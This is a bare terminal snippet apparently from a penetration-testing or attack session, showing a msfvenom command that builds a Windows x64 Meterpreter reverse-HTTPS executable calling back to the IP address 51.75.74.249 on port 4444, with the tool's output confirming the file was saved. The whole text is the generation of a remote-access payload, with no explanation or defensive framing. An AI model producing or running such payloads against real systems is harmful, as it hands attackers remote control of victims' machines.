


```
─$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=51.75.74.249 LPORT=4444 EXITFUNC=thread -f exe -o msfstage_https_x64.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 691 bytes
Final size of exe file: 7168 bytes
Saved as: msfstage_https_x64.exe
```
